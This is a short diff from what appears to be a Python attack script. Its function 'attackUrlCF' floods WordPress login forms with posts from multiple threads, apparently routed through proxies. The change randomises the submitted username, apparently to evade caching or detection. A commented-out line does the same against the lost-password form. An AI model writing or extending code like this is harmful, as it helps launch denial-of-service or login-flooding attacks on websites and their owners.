@@ -115,7 +115,7 @@ def attackUrlCF(baseUrl, threadNum):
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
-			data= {'log':"asdasd",'pwd':"asdasd", 'redirect_to':"",'wp-submit':"Log+In", 'testcookie':"1"}
+			data= {'log':''.join(random.choice(letters) for i in range(10)),'pwd':"asdasd", 'redirect_to':"",'wp-submit':"Log+In", 'testcookie':"1"}
 			#data = {'user_login': ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",'redirect_to':"",'wp-submit':"Get+New+Password"}
 			# print(proxies, cookiesStr)
 			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
